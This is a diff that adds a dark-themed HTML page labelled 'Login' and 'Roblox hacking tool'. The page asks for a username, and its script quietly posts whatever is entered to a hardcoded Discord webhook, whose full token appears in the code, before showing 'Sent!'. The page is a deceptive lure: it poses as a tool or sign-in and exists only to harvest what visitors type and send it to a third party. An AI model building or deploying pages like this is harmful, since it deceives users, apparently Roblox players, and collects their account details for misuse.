@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #0d0d0d;
+            font-family: Arial, sans-serif;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background: #1a1a1a;
+            padding: 40px;
+            border-radius: 12px;
+            width: 320px;
+            box-shadow: 0 0 25px rgba(0, 0, 0, 0.5);
+        }
+
+        h2 {
+            text-align: center;
+            margin-bottom: 25px;
+            font-weight: 300;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border-radius: 8px;
+            border: none;
+            background: #333;
+            color: white;
+            font-size: 16px;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #4a4a4a;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            color: white;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background: #5a5a5a;
+        }
+
+        .success {
+            text-align: center;
+            margin-top: 10px;
+            color: #4caf50;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Roblox hacking tool</h2>
+
+        <input type="text" id="username" placeholder="Username">
+
+        <button onclick="sendData()">Sign In</button>
+
+        <p class="success" id="msg">Sent!</p>
+    </div>
+
+    <script>
+        function sendData() {
+            const username = document.getElementById("username").value.trim();
+            const webhook = "https://discord.com/api/webhooks/1439023714996981921/HTm7P3QHm_C44SYxE0PT8Z53gJH354ZmOEFQdncuX8hIt6mUgDRbrJ5sySlVWj2dGU0_";
+
+            if (!username) return;
+
+            fetch(webhook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: `New username submitted: **${username}**`
+                })
+            })
+            .then(() => {
+                document.getElementById("msg").style.display = "block";
+            })
+            .catch(err => console.error("Error sending to Discord:", err));
+        }
+    </script>
+
+</body>
+</html>
